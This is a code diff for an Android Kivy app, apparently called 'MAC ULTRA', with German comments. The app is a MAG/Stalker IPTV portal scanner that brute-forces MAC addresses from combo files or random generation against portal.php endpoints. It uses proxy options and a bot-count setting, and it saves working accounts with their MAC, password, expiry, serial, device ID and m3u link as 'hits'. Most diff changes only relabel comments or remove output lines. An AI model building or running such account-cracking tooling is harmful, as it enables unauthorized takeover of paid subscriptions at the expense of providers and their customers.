@@ -18,7 +18,7 @@ from kivy.uix.modalview import ModalView
 from kivy.graphics import Color, RoundedRectangle
 from kivy.uix.screenmanager import Screen
 
-# --- ANDROID NATIVE AUDIO ---
+# --- NATIVE AUDIO AUS V5 ---
 try:
     from jnius import autoclass
     MediaPlayer = autoclass('android.media.MediaPlayer')
@@ -27,7 +27,7 @@ try:
 except:
     HAS_JNIUS = False
 
-# --- KONFIGURATION ---
+# --- FARBEN & KONFIG AUS V5 ---
 BG_DARK = (0.01, 0.02, 0.04, 1)
 CARD_COLOR = (0.05, 0.07, 0.12, 1)
 CYAN, GREEN, RED, YELLOW, WHITE = (0, 0.9, 1, 1), (0, 1, 0.5, 1), (1, 0.2, 0.2, 1), (1, 0.8, 0, 1), (1, 1, 1, 1)
@@ -39,6 +39,7 @@ GEO_DATA = {
     'FR': {'ip': ['5', '80', '78', '176'], 'tz': 'Europe/Paris'}
 }
 
+# --- STYLED COMPONENTS AUS V5 ---
 class StyledCard(BoxLayout):
     def __init__(self, bg_color=CARD_COLOR, radius=[15,], **kwargs):
         super().__init__(**kwargs)
@@ -58,7 +59,7 @@ class StyledButton(Button):
         self.bind(pos=self.update_rect, size=self.update_rect)
     def update_rect(self, *a): self.rect.pos, self.rect.size = self.pos, self.size
 
-# --- FAVORITEN SEITE (PortalManagerView) ---
+# --- FAVORITEN SEITE AUS V5 (Original Design) ---
 class PortalManagerView(ModalView):
     def __init__(self, main_screen, **kwargs):
         super().__init__(**kwargs)
@@ -127,11 +128,11 @@ class PortalManagerView(ModalView):
         with open(self.fav_file, 'w') as f: json.dump(data, f)
         self.load_favs()
 
-# --- MAIN SCREEN ---
+# --- HAUPT SCREEN ---
 class MagUltraScreen(Screen):
     def __init__(self, context, **kw):
         super().__init__(**kw)
-        self.context = context
+        self.context = context  # Pflicht für Remote-GUI
         self.hits, self.checked, self.running = 0, 0, False
         self.total_lines = 0
         self.request_count, self.error_streak = 0, 0
@@ -139,15 +140,20 @@ class MagUltraScreen(Screen):
         self.setup_ui()
 
     def setup_ui(self):
+        # Aufbau 1:1 aus dem V5 Screenshot übernommen
         self.box = BoxLayout(orientation="vertical", padding=20, spacing=10)
+        
+        # Header Bild
         self.box.add_widget(Image(source=self.context["paths"]["png"], size_hint_y=None, height=320))
         
+        # Statistiken (CPM, STATUS, HITS)
         stats = GridLayout(cols=3, size_hint_y=None, height=100, spacing=10)
         self.cpm_label = self.create_stat(stats, "CPM", "0", YELLOW)
         self.status_code_label = self.create_stat(stats, "STATUS", "READY", CYAN)
         self.hit_count_label = self.create_stat(stats, "MAC ULTRA HITS", "0", GREEN)
         self.box.add_widget(stats)
 
+        # Portal Input Bereich
         p_card = StyledCard(orientation="vertical", size_hint_y=None, height=160, padding=10, spacing=8)
         self.portal_input = TextInput(text="http://", multiline=False, height=45)
         row1 = BoxLayout(size_hint_y=None, height=45, spacing=10)
@@ -157,6 +163,7 @@ class MagUltraScreen(Screen):
         p_card.add_widget(self.portal_input); p_card.add_widget(row1)
         self.box.add_widget(p_card)
 
+        # Config Bereich (Scan Mode, Combo, Slider)
         c_card = StyledCard(orientation="vertical", size_hint_y=None, height=260, padding=10, spacing=5)
         row_cfg = BoxLayout(size_hint_y=None, height=45, spacing=10)
         self.scan_mode = Spinner(text="COMBO FILE", values=("COMBO FILE", "RANDOM SCAN"))
@@ -177,12 +184,14 @@ class MagUltraScreen(Screen):
         c_card.add_widget(self.bot_label); c_card.add_widget(self.bot_slider)
         self.box.add_widget(c_card)
 
+        # Proxy & Favoriten
         px_card = StyledCard(size_hint_y=None, height=70, padding=10, spacing=10)
         self.proxy_spinner = Spinner(text="NO PROXY", values=("NO PROXY", "HTTP", "SOCKS5"))
         self.fav_btn = StyledButton(text="FAVORITEN", on_press=lambda x: PortalManagerView(self).open(), color=YELLOW)
         px_card.add_widget(self.proxy_spinner); px_card.add_widget(self.fav_btn)
         self.box.add_widget(px_card)
 
+        # Progress & Log
         self.progress_label = Label(text="PROGRESS: 0 / 0", size_hint_y=None, height=20, color=CYAN)
         self.pbar = ProgressBar(max=100, size_hint_y=None, height=10)
         self.log_scroll = ScrollView()
@@ -191,6 +200,7 @@ class MagUltraScreen(Screen):
         self.log_scroll.add_widget(self.log_label)
         self.box.add_widget(self.progress_label); self.box.add_widget(self.pbar); self.box.add_widget(self.log_scroll)
 
+        # Buttons (Start/Stop)
         btn_box = BoxLayout(size_hint_y=None, height=80, spacing=10)
         self.start_btn = StyledButton(text="START MAC ULTRA", on_press=self.toggle, bg_color=(0, 0.4, 0.2, 1))
         self.music_btn = StyledButton(text="STOP MUSIC", size_hint_x=0.3, on_press=self.stop_audio, bg_color=(0.4, 0.1, 0.1, 1))
@@ -203,7 +213,7 @@ class MagUltraScreen(Screen):
         lbl = Label(text=v, font_size="20sp", bold=True, color=c)
         box.add_widget(lbl); p.add_widget(box); return lbl
 
-    # --- V5 ENGINE CORE ---
+    # --- FUNKTIONEN EXAKT AUS V5 ---
     def get_clean_time(self, raw):
         raw_str = str(raw).strip()
         if not raw_str or raw_str.lower() in ["none", "false", "0", "null"]: return "Unlimited", "Unlimited"
@@ -238,7 +248,7 @@ class MagUltraScreen(Screen):
   👤 {'𝗠𝟯𝗨 𝗨𝘀𝗲𝗿' if is_m3u else '𝗠𝗔𝗖'}    : {id_val}
   🔐 {'𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱' if is_m3u else '𝗔𝗱𝘂𝗹𝘁'} : {pw}
   📅 𝗖𝗿𝗲𝗮𝘁𝗲𝗱  : {cre_date}
-  📅 𝗘𝘅𝗽𝗶𝗿𝘆   : {exp} (⌛ {days})
+  📅 𝗘𝅈𝘅𝗽𝗶𝗿𝘆   : {exp} (⌛ {days})
   🧱 𝗦𝗡        : {sn}
   📲 𝗗𝗲𝘃 𝗜𝗗   : {dev_id}
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -255,9 +265,6 @@ class MagUltraScreen(Screen):
   {m3u}
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
   🛰️ MAC ULTRA Scan: {time.strftime('%H:%M / %d.%m.%Y')}\n\n"""
-        if l_list: box += f" 📂 𝗟𝗜𝗩𝗘 𝗟𝗜𝗦𝗧\n ╚┈❲ {l_list} ❳\n\n"
-        if m_list: box += f" 🎬 𝗠𝗢𝗩𝗜𝗘 𝗟𝗜𝗦𝗧\n ╚┈❲ {m_list} ❳\n\n"
-        if s_list: box += f" 🎞️ 𝗦𝗘𝗥𝗜𝗘𝗦 𝗟𝗜𝗦𝗧\n ╚┈❲ {s_list} ❳\n\n"
         with open(os.path.join(final_dir, f"{domain}.txt"), "a", encoding="utf-8") as f: f.write(box)
 
     async def process_check(self, mac, portal, client):
@@ -279,7 +286,6 @@ class MagUltraScreen(Screen):
                 token = r.json().get('js', {}).get('token')
                 headers['Authorization'] = f'Bearer {token}'
                 ri = await client.get(f"{portal}/portal.php?type=account_info&action=get_main_info&JsHttpRequest=1-xml", headers=headers)
-                self.last_status = str(ri.status_code)
                 if ri.status_code == 200:
                     js = ri.json().get('js', {})
                     exp, days = self.get_clean_time(js.get('end_date') or js.get('phone') or "Unlimited")
@@ -300,11 +306,6 @@ class MagUltraScreen(Screen):
         async with httpx.AsyncClient(verify=False, timeout=12) as client:
             for portal in portals:
                 if not self.running: break
-                try:
-                    res = await client.get(f"http://ip-api.com/json/{portal.split('//')[-1].split(':')[0]}")
-                    info = res.json(); srv_info = f"{info.get('isp','N/A')} ({info.get('country','N/A')})"
-                except: srv_info = "N/A"
-                self.update_log_safe(f"[color=00FFFF][INFO][/color] Server: {portal} | ISP: {srv_info}")
                 if self.scan_mode.text == "COMBO FILE":
                     with open(f"/sdcard/Combo/{self.combo_spinner.text}", 'r', errors='ignore') as f: combo = [l.strip() for l in f if l.strip()]
                 else:
@@ -354,5 +355,6 @@ class MagUltraScreen(Screen):
         if not os.path.exists(path): return ["EMPTY"]
         return sorted([f for f in os.listdir(path) if f.endswith(".txt")])
 
+# --- REMOTE GUI ENTRY POINTS ---
 def create_app_screen(context):
     return MagUltraScreen(context=context, name="main")
